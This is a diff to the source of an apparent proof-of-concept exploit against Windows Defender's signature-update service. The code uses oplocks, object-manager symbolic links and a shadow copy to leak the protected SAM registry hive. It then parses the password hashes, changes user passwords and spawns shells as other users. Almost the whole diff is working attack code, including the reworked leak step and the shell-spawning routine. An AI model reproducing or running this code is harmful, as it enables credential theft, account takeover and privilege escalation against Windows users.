@@ -1,4 +1,3 @@
-// Special thanks to Tom Gallagher, Igor Tsyganskiy and Jeremy Tinder for making this PoC publicly disclosed !!!
 
 #define _CRT_SECURE_NO_WARNINGS
 
@@ -93,6 +92,19 @@ NTSTATUS(WINAPI* _NtSetInformationFile)(
 		ULONG                  Length,
 		FILE_INFORMATION_CLASS FileInformationClass
 		))GetProcAddress(hm, "NtSetInformationFile");
+
+NTSTATUS(WINAPI* _NtCreateDirectoryObjectEx)(
+	OUT PHANDLE             DirectoryHandle,
+	IN ACCESS_MASK          DesiredAccess,
+	IN POBJECT_ATTRIBUTES   ObjectAttributes,
+	IN HANDLE ShadowDirectoryHandle,
+	IN ULONG Flags) =
+	(NTSTATUS(WINAPI*)(
+		OUT PHANDLE             DirectoryHandle,
+		IN ACCESS_MASK          DesiredAccess,
+		IN POBJECT_ATTRIBUTES   ObjectAttributes,
+		IN HANDLE ShadowDirectoryHandle,
+		IN ULONG Flags))GetProcAddress(hm,"NtCreateDirectoryObjectEx");
 
 #define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))
 
@@ -192,6 +204,7 @@ struct UpdateFiles {
 	void* filebuff;
 	DWORD filesz;
 	bool filecreated;
+	HANDLE hsymlink;
 	UpdateFiles* next;
 };
 ///////////////////////////////////////
@@ -279,9 +292,9 @@ void CallWD(WDRPCWorkerThreadArgs* args)
 		RaiseExceptionInThread(args->hntfythread);
 		return;
 	}
-	// PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update.
 	error_status_t errstat = 0;
 	printf("Calling ServerMpUpdateEngineSignature...\n");
+	//_getch();
 	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
 	args->res = stat;
 	if (args->hevent)
@@ -426,13 +439,9 @@ INT_PTR CUST_FNFDINOTIFY(
 			lcab->FileSize = pfdin->cb;
 			lcab->buff = (char*)malloc(lcab->FileSize);
 			ZeroMemory(lcab->buff, lcab->FileSize);
-
-
 		}
 		else
 		{
-
-
 			lcab->next = (CabOpArguments*)malloc(sizeof(CabOpArguments));
 			ZeroMemory(lcab->next, sizeof(CabOpArguments));
 			lcab->next->first = lcab->first;
@@ -622,7 +631,6 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	HRSRC hres = NULL;
 	DWORD ressz = NULL;
 	HGLOBAL cabbuff = NULL;
-	HANDLE htransaction = NULL;
 	char fname[] = "update.cab";
 	ERF erfstruct = { 0 };
 	HFDI hcabctx = NULL;
@@ -1756,6 +1764,40 @@ cleanup:
 // Volume shadow copy functions end
 /////////////////////////////////////////////////////////////////////
 
+//////////////////////////////////////////////////////////////////////
+// SAM handling start
+/////////////////////////////////////////////////////////////////////
+
+
+#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
+#define SAM_DATABASE_USERNAME_OFFSET 0x0c
+#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
+#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
+#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
+#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
+#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac
+
+struct PwdEnc
+{
+	char* buff;
+	size_t sz;
+	wchar_t* username;
+	ULONG usernamesz;
+	char* LMHash;
+	ULONG LMHashLenght;
+	char* NTHash;
+	ULONG NTHashLenght;
+	ULONG rid;
+
+};
+
+
+NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
+NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
+NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
+NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
+NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);
+
 
 
 void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
@@ -2194,35 +2236,6 @@ unsigned char* HexToHexString(unsigned char* data, int size)
 	return retval;
 }
 
-#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
-#define SAM_DATABASE_USERNAME_OFFSET 0x0c
-#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
-#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
-#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
-#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
-#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac
-
-struct PwdEnc
-{
-	char* buff;
-	size_t sz;
-	wchar_t* username;
-	ULONG usernamesz;
-	char* LMHash;
-	ULONG LMHashLenght;
-	char* NTHash;
-	ULONG NTHashLenght;
-	ULONG rid;
-
-};
-
-
-NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
-NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
-NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
-NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
-NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);
-
 
 char* CalculateNTLMHash(char* _input)
 {
@@ -2384,50 +2397,14 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	*/
 	return true;
 }
+//////////////////////////////////////////////////////////////////////
+// SAM handling end
+/////////////////////////////////////////////////////////////////////
 
 
-
-typedef struct _SYSTEM_PROCESS_INFORMATION2
-{
-	ULONG NextEntryOffset;
-	ULONG NumberOfThreads;
-	LARGE_INTEGER WorkingSetPrivateSize; // since VISTA
-	ULONG HardFaultCount; // since WIN7
-	ULONG NumberOfThreadsHighWatermark; // since WIN7
-	ULONGLONG CycleTime; // since WIN7
-	LARGE_INTEGER CreateTime;
-	LARGE_INTEGER UserTime;
-	LARGE_INTEGER KernelTime;
-	UNICODE_STRING ImageName;
-	KPRIORITY BasePriority;
-	HANDLE UniqueProcessId;
-	HANDLE InheritedFromUniqueProcessId;
-	ULONG HandleCount;
-	ULONG SessionId;
-	ULONG_PTR UniqueProcessKey; // since VISTA (requires SystemExtendedProcessInformation)
-	SIZE_T PeakVirtualSize;
-	SIZE_T VirtualSize;
-	ULONG PageFaultCount;
-	SIZE_T PeakWorkingSetSize;
-	SIZE_T WorkingSetSize;
-	SIZE_T QuotaPeakPagedPoolUsage;
-	SIZE_T QuotaPagedPoolUsage;
-	SIZE_T QuotaPeakNonPagedPoolUsage;
-	SIZE_T QuotaNonPagedPoolUsage;
-	SIZE_T PagefileUsage;
-	SIZE_T PeakPagefileUsage;
-	SIZE_T PrivatePageCount;
-	LARGE_INTEGER ReadOperationCount;
-	LARGE_INTEGER WriteOperationCount;
-	LARGE_INTEGER OtherOperationCount;
-	LARGE_INTEGER ReadTransferCount;
-	LARGE_INTEGER WriteTransferCount;
-	LARGE_INTEGER OtherTransferCount;
-	SYSTEM_THREAD_INFORMATION Threads[1]; // SystemProcessInformation
-	// SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; // SystemExtendedProcessinformation
-	// SYSTEM_EXTENDED_THREAD_INFORMATION + SYSTEM_PROCESS_INFORMATION_EXTENSION // SystemFullProcessInformation
-} SYSTEM_PROCESS_INFORMATION2, * PSYSTEM_PROCESS_INFORMATION2;
-
+//////////////////////////////////////////////////////////////////////
+// Exploit shell spawn start
+/////////////////////////////////////////////////////////////////////
 BOOL SetPrivilege(
 	HANDLE hToken,          // access token handle
 	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
@@ -2478,7 +2455,7 @@ BOOL SetPrivilege(
 }
 
 
-bool DoSpawnShellAsAllUsers(wchar_t* sampath)
+bool DoSpawnShellAsAllUsers(HANDLE samfile)
 {
 	//SSL_library_init();
 	//SSL_load_error_strings();
@@ -2489,7 +2466,8 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	char* retval = 0;
 	ORHKEY hSAMhive = NULL;
 	ORHKEY hSYSTEMhive = NULL;
-	DWORD err = OROpenHive(sampath, &hSAMhive);
+	DWORD err = OROpenHiveByHandle(samfile, &hSAMhive);
+
 	bool systemshelllaunched = false;
 	if (err)
 	{
@@ -2878,6 +2856,11 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 }
 
+
+//////////////////////////////////////////////////////////////////////
+// Exploit shell spawn end
+/////////////////////////////////////////////////////////////////////
+
 int wmain(int argc, wchar_t* argv[])
 {
 
@@ -2895,8 +2878,9 @@ int wmain(int argc, wchar_t* argv[])
 		}
 		return 0;
 	}
-	
 
+	DWORD _sesid = 0;
+	ProcessIdToSessionId(GetCurrentProcessId(), &_sesid);
 	const wchar_t* filestoleak[] = { {L"\\Windows\\System32\\Config\\SAM"}
 	/*,{L"\\Windows\\System32\\Config\\SYSTEM"},{L"\\Windows\\System32\\Config\\SECURITY"}*/
 	};
@@ -2904,52 +2888,8 @@ int wmain(int argc, wchar_t* argv[])
 	HANDLE hreleaseready = NULL;
 	wchar_t updtitle[0x200] = { 0 };
 	wchar_t targetfile[MAX_PATH] = { 0 };
-	wchar_t copiedfilepath[MAX_PATH] = { 0 };
-	/*
-	if (argc >= 2) {
-		wcscpy(targetfile, argv[1]);
-		printf("Target file : \"%ws\"\n", targetfile);
-	}
-	else {
-		
-		wcscpy(targetfile, L"C:\\Windows\\System32\\Config\\ELAM");
-		printf("No source file specified, \"%ws\" will be used.\n", targetfile);
-	}
-	if (argc > 2) {
-		wcscpy(copiedfilepath, argv[2]);
-		printf("Copy file path : \"%ws\"\n", copiedfilepath);
-	}
-	else
-	{
-
-		printf("No file path was specified for file copy, \"%ws\" will be used.\n", copiedfilepath);
-	}
-
-	HANDLE hcheck = CreateFile(copiedfilepath, GENERIC_WRITE | DELETE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_DELETE_ON_CLOSE, NULL);
-	if (!hcheck || hcheck == INVALID_HANDLE_VALUE)
-	{
-		printf("Cannot open file to copy leaked file to, please specify a different path");
-		return 0;
-	}
-	CloseHandle(hcheck);
-	hcheck = CreateFile(targetfile, FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hcheck && hcheck != INVALID_HANDLE_VALUE)
-	{
-		printf("Target file can be opened for read access, exiting.");
-		CloseHandle(hcheck);
-		return 0;
-	}
-	DWORD lasterr = GetLastError();
-	if(lasterr == ERROR_FILE_NOT_FOUND || lasterr == ERROR_PATH_NOT_FOUND)
-	{
-		printf("Target file does not exist.\n");
-		return 0;
-	}
-	*/
 	wchar_t nttargetfile[MAX_PATH] = { 0 };
-	//wcscpy(nttargetfile, L"\\??\\");
-	//wcscat(nttargetfile, targetfile);
-
+	HANDLE htransaction = NULL;
 	wchar_t* filestodel[100] = { 0 };
 	HINTERNET hint = NULL;
 	HINTERNET hint2 = NULL;
@@ -2992,20 +2932,14 @@ int wmain(int argc, wchar_t* argv[])
 	OBJECT_ATTRIBUTES objattr = { 0 };
 	IO_STATUS_BLOCK iostat = { 0 };
 	HANDLE hupdatefile = NULL;
+	UNICODE_STRING objlinkname = { 0 };
+	UNICODE_STRING objlinktarget = { 0 };
 	NTSTATUS ntstat = 0;
 	OVERLAPPED ovd = { 0 };
 	DWORD transfersz = 0;
 	wchar_t newname[MAX_PATH] = { 0 };
 	DWORD renstructsz = 0;
-	UNICODE_STRING objlinkname = { 0 };
-	UNICODE_STRING objlinktarget = { 0 };
-	FILE_RENAME_INFO* fri = 0;
-	wchar_t wreparsedirpath[MAX_PATH] = { 0 };
-	UNICODE_STRING reparsedirpath = { 0 };
-	HANDLE hreparsedir = NULL;
-	wchar_t newtmp[MAX_PATH] = { 0 };
-	wchar_t rptarget[MAX_PATH] = { 0 };
-	wchar_t printname[1] = { L'\0' };
+
 	size_t targetsz = 0;
 	size_t printnamesz = 0;
 	size_t pathbuffersz = 0;
@@ -3029,10 +2963,11 @@ int wmain(int argc, wchar_t* argv[])
 	UpdateFiles* UpdateFilesListCurrent = NULL;
 	bool isvssready = false;
 	bool criterr = false;
-
-
+	HANDLE hobjworkdir = NULL;
+	HANDLE hsymlink = NULL;
+	wchar_t objdirpath[MAX_PATH] = { 0 };
 	try {
-
+		
 		printf("Checking for windows defender signature updates...\n");
 		while (!CheckForWDUpdates(updtitle, &criterr)){
 
@@ -3064,15 +2999,35 @@ int wmain(int argc, wchar_t* argv[])
 		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
 		if (!isvssready)
 			goto cleanup;
-
+			
 		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
 		{
+			ZeroMemory(objdirpath, sizeof(objdirpath));
 			UpdateFilesListCurrent = UpdateFilesList;
 			UuidCreate(&uid);
 			UuidToStringW(&uid, &wuid);
 			wuid2 = (wchar_t*)wuid;
 			wcscpy(envstr, L"%TEMP%\\");
 			wcscat(envstr, wuid2);
+
+			{
+				
+				OBJECT_ATTRIBUTES ndirobjattr = { 0 };
+				UNICODE_STRING objdirunistr = { 0 };
+				
+
+				wnsprintf(objdirpath, MAX_PATH, L"\\Sessions\\%d\\BaseNamedObjects\\%s", _sesid, wuid2);
+				RtlInitUnicodeString(&objdirunistr, objdirpath);
+				InitializeObjectAttributes(&ndirobjattr, &objdirunistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+				ntstat = _NtCreateDirectoryObjectEx(&hobjworkdir, GENERIC_ALL, &ndirobjattr,NULL,NULL);
+				if (ntstat)
+				{
+					printf("NtCreateDirectoryObjectEx Failed : 0x%0.8X\n", ntstat);
+					goto cleanup;
+				}
+			}
+
+
 			ExpandEnvironmentStrings(envstr, updatepath, MAX_PATH);
 			needupdatedircleanup = CreateDirectory(updatepath, NULL);
 			if (!needupdatedircleanup)
@@ -3081,14 +3036,33 @@ int wmain(int argc, wchar_t* argv[])
 				goto cleanup;
 			}
 			printf("Created update directory %ws\n", updatepath);
+
+			{
+				UNICODE_STRING _unisrc = { 0 };
+				RtlInitUnicodeString(&_unisrc, L"WDUpdateDirectory");
+				OBJECT_ATTRIBUTES _smobjattr = { 0 };
+				InitializeObjectAttributes(&_smobjattr, &_unisrc, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);
+				UNICODE_STRING _unidest = { 0 };
+				wchar_t unidest[MAX_PATH] = { 0 };
+				wcscpy(unidest, L"\\??\\");
+				wcscat(unidest, updatepath);
+				RtlInitUnicodeString(&_unidest, unidest);
+				ntstat = _NtCreateSymbolicLinkObject(&hsymlink, GENERIC_ALL, &_smobjattr, &_unidest);
+				if (ntstat)
+				{
+					printf("NtCreateSymbolicLinkObject failed with error : 0x%0.8X\n", ntstat);
+					goto cleanup;
+				}
+			}
+
 			while (UpdateFilesListCurrent)
 			{
 				wchar_t filepath[MAX_PATH] = { 0 };
-				//wchar_t filename[MAX_PATH] = { 0 };
+				wchar_t filename[MAX_PATH] = { 0 };
 				wcscpy(filepath, updatepath);
 				wcscat(filepath, L"\\");
-				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filepath[lstrlenW(filepath)], MAX_PATH - lstrlenW(filepath));
-
+				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, filename, MAX_PATH);
+				wcscat(filepath, filename);
 
 				HANDLE hupdate = CreateFile(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, NULL, NULL);
 
@@ -3124,7 +3098,9 @@ int wmain(int argc, wchar_t* argv[])
 				printf("Unexpected error while opening current thread, error : %d", GetLastError());
 				goto cleanup;
 			}
-			threadargs.dirpath = updatepath;
+			wchar_t thrdupdpath[MAX_PATH] = { 0 };
+			wsprintf(thrdupdpath, L"\\\\?\\GLOBALROOT\\Sessions\\%d\\BaseNamedObjects\\%s\\WDUpdateDirectory", _sesid, wuid2);
+			threadargs.dirpath = thrdupdpath;
 			threadargs.hntfythread = hcurrentthread;
 			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
 			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
@@ -3180,106 +3156,41 @@ int wmain(int argc, wchar_t* argv[])
 			GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
 			printf("oplock triggered !\n");
 
-			//
+			CloseHandle(hsymlink);
 
-			wcscpy(newname, updatepath);
-			wcscat(newname, L".WDFOO");
-			renstructsz = sizeof(FILE_RENAME_INFO) + wcslen(newname) * sizeof(wchar_t) + sizeof(wchar_t);
-			fri = (FILE_RENAME_INFO*)malloc(renstructsz);
-			ZeroMemory(fri, renstructsz);
-			fri->ReplaceIfExists = TRUE;
-			fri->FileNameLength = wcslen(newname) * sizeof(wchar_t);
-			wcscpy(&fri->FileName[0], newname);
-			if (!SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz))
+
+
 			{
-				printf("Failed to move file from %ws to %ws error : %d", updatelibpath, newname, GetLastError());
-				goto cleanup;
+				UNICODE_STRING _unisrc = { 0 };
+				RtlInitUnicodeString(&_unisrc, L"WDUpdateDirectory");
+				OBJECT_ATTRIBUTES _smobjattr = { 0 };
+				InitializeObjectAttributes(&_smobjattr, &_unisrc, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);
+				UNICODE_STRING _unidest = { 0 };
+				RtlInitUnicodeString(&_unidest, objdirpath);
+				ntstat = _NtCreateSymbolicLinkObject(&hsymlink, GENERIC_ALL, &_smobjattr, &_unidest);
+				if (ntstat)
+				{
+					printf("NtCreateSymbolicLinkObject failed with error : 0x%0.8X\n", ntstat);
+					goto cleanup;
+				}
+
+				RtlInitUnicodeString(&objlinkname, L"mpasbase.vdm");
+				ZeroMemory(nttargetfile, sizeof(nttargetfile));
+				wcscpy(nttargetfile, fullvsspath);
+				wcscat(nttargetfile, filestoleak[x]);
+				RtlInitUnicodeString(&objlinktarget, nttargetfile);
+				InitializeObjectAttributes(&objattr, &objlinkname, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);
+
+				ntstat = _NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
+				if (ntstat)
+				{
+					printf("Failed to create object manager symbolic link, error : 0x%0.8X\n", ntstat);
+					goto cleanup;
+				}
+
 			}
-			free(fri);
-			fri = NULL;
-			printf("File moved  %ws to %ws\n", updatelibpath, newname);
-			//
 
 
-			wcscpy(newtmp, updatepath);
-			wcscat(newtmp, L".foo");
-			if (!MoveFile(updatepath, newtmp))
-			{
-				printf("Failed to move %ws to %ws, error : %d", updatepath, newtmp, GetLastError());
-				goto cleanup;
-			}
-			dirmoved = true;
-			printf("Directory moved %ws to %ws\n", updatepath, newtmp);
-
-			wcscpy(wreparsedirpath, L"\\??\\");
-			wcscat(wreparsedirpath, updatepath);
-
-			RtlInitUnicodeString(&reparsedirpath, wreparsedirpath);
-			InitializeObjectAttributes(&objattr, &reparsedirpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
-			if (ntstat)
-			{
-				printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
-				goto cleanup;
-			}
-			printf("Recreated %ws\n", updatepath);
-
-
-			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
-			targetsz = wcslen(rptarget) * 2;
-			printnamesz = 1 * 2;
-			pathbuffersz = targetsz + printnamesz + 12;
-			totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
-			rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
-			rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
-			rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
-			rdb->Reserved = NULL;
-			rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
-			rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
-			memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
-			rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
-			rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
-			memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);
-
-			ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-			if (!ov.hEvent)
-			{
-				printf("Failed to create event, error : %d", GetLastError());
-				goto cleanup;
-			}
-			DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
-			HeapFree(GetProcessHeap(), NULL, rdb);
-			rdb = NULL;
-			if (GetLastError() == ERROR_IO_PENDING) {
-				GetOverlappedResult(hreparsedir, &ov, &retsz, TRUE);
-			}
-			if (GetLastError() != ERROR_SUCCESS)
-			{
-				printf("Failed to create reparse point, error : %d", GetLastError());
-				goto cleanup;
-			}
-			printf("Junction created %ws => %ws\n", updatepath, rptarget);
-
-			ZeroMemory(nttargetfile, sizeof(nttargetfile));
-			wcscpy(nttargetfile, fullvsspath);
-			wcscat(nttargetfile, filestoleak[x]);
-
-			RtlInitUnicodeString(&objlinkname, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
-			RtlInitUnicodeString(&objlinktarget, nttargetfile);
-			InitializeObjectAttributes(&objattr, &objlinkname, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-			ntstat = _NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
-			if (ntstat)
-			{
-				printf("Failed to create object manager symbolic link, error : %d", GetLastError());
-				goto cleanup;
-			}
-			printf("Object manager link created %ws => %ws\n", objlinkname.Buffer, objlinktarget.Buffer);
-
-			//TerminateThread(hthread, ERROR_SUCCESS); // kill the thread, don't care if it is still running
-			//CloseHandle(hthread);
-			//hthread = NULL;
 			CloseHandle(ov.hEvent);
 			ov.hEvent = NULL;
 			CloseHandle(ovd.hEvent);
@@ -3289,76 +3200,33 @@ int wmain(int argc, wchar_t* argv[])
 
 
 			wcscat(newdefupdatedirname, L"\\mpasbase.vdm");
+
+			htransaction = CreateTransaction(NULL, NULL, TRANSACTION_DO_NOT_PROMOTE, NULL, NULL, NULL, NULL);
+			if (!htransaction)
+			{
+				printf("Failed to open leaked file.\n");
+				goto cleanup;
+			}
 			do {
-				hleakedfile = CreateFile(newdefupdatedirname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+				hleakedfile = CreateFileTransacted(newdefupdatedirname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL,htransaction,NULL,NULL);
 			} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
 			printf("Leaked file opened %ws\n", newdefupdatedirname);
 
 
 			CloseHandle(hdir);
 			hdir = NULL;
-			CloseHandle(hreparsedir);
-			hreparsedir = NULL;
 			CloseHandle(hobjlink);
 			hobjlink = NULL;
-
-			GetFileSizeEx(hleakedfile, &_filesz);
-			LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL, _filesz.LowPart, _filesz.HighPart, &ovd2);
-			filelocked = true;
-			leakedfilebuff = malloc(_filesz.QuadPart);
-			if (!leakedfilebuff)
-			{
-				printf("Failed to allocate enough memory to copy leaked file !!!");
-				goto cleanup;
-			}
-
-			if (!ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
-			{
-				printf("Failed to read file, error : %d\n", GetLastError());
-				goto cleanup;
-			}
-
-			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
-			filelocked = false;
-			CloseHandle(hleakedfile);
-			printf("Read %d bytes\n", __readsz);
-
-			ZeroMemory(copiedfilepath, sizeof(copiedfilepath));
-
-			UuidCreate(&uid);
-			UuidToStringW(&uid, &wuid);
-			wuid2 = (wchar_t*)wuid;
-			wchar_t env2[MAX_PATH] = { 0 };
-			wcscpy(env2, L"%TEMP%\\");
-			wcscat(env2, wuid2);
-
-			ExpandEnvironmentStrings(env2, copiedfilepath, sizeof(copiedfilepath) / sizeof(wchar_t));
-			//wcscat(copiedfilepath, L"\\");
-			//wcscat(copiedfilepath, PathFindFileName(filestoleak[x]));
-
-			hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
-			{
-				printf("Failed to create leaked file, error : %d", GetLastError());
-				goto cleanup;
-			}
-			if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
-			{
-				printf("Failed to write leaked file, error : %d", GetLastError());
-				CloseHandle(hleakedfile);
-				hleakedfile = NULL;
-				// delete the file
-				DeleteFile(copiedfilepath);
-				goto cleanup;
-			}
-			CloseHandle(hleakedfile);
-			hleakedfile = NULL;
 			printf("Exploit succeeded.\n");
 			SetEvent(hreleaseready);
 
-			printf("SAM file written at : %ws\n", copiedfilepath);
-			DoSpawnShellAsAllUsers(copiedfilepath);
-
+			
+			DoSpawnShellAsAllUsers(hleakedfile);
+			CloseHandle(hleakedfile);
+			hleakedfile = NULL;
+			RollbackTransaction(htransaction);
+			CloseHandle(htransaction);
+			htransaction = NULL;
 			WaitForSingleObject(hthread, INFINITE);
 			CloseHandle(hthread);
 			hthread = NULL;
@@ -3389,8 +3257,6 @@ cleanup:
 		FDIDestroy(hcabctx);
 	if (hdir)
 		CloseHandle(hdir);
-	if (fri)
-		free(fri);
 	if (rdb)
 		HeapFree(GetProcessHeap(), NULL, rdb);
 	if (ov.hEvent)
@@ -3417,7 +3283,7 @@ cleanup:
 	if (needupdatedircleanup)
 	{
 		wchar_t dirtoclean[MAX_PATH] = { 0 };
-		wcscpy(dirtoclean, dirmoved ? newtmp : updatepath);
+		wcscpy(dirtoclean, updatepath);
 		UpdateFilesListCurrent = UpdateFilesList;
 		while(UpdateFilesListCurrent)
 		{
@@ -3430,6 +3296,10 @@ cleanup:
 				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filetodel[lstrlenW(filetodel)], MAX_PATH - lstrlenW(filetodel) * sizeof(wchar_t));
 				DeleteFile(filetodel);
 			}
+			if (UpdateFilesListCurrent->hsymlink) {
+				CloseHandle(UpdateFilesListCurrent->hsymlink);
+				UpdateFilesListCurrent->hsymlink = NULL;
+			}
 			UpdateFiles* UpdateFilesListOld = UpdateFilesListCurrent;
 			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
 			free(UpdateFilesListOld);
@@ -3441,14 +3311,3 @@ cleanup:
 	return 0;
 }
 
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
